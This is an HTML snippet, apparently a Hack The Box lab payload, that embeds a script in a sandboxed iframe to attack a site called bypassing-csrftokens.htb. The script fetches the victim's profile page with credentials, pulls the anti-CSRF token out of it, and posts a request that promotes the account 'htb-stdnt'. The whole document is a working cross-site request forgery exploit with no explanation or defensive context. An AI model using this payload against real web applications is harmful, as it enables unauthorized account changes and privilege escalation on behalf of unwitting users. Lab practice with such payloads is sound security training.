<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
    // GET CSRF token
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://bypassing-csrftokens.htb/profile.php', false);
    xhr.withCredentials = true;
    xhr.send();
    var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
    var csrftoken = encodeURIComponent(doc.getElementById('csrf').value);

    // CSRF exploit
    var csrf_req = new XMLHttpRequest();
    var params = `promote=htb-stdnt&csrf=${csrftoken}`;
    csrf_req.open('POST', 'https://bypassing-csrftokens.htb/profile.php', false);
    csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    csrf_req.withCredentials = true;
    csrf_req.send(params);
</script"></iframe>
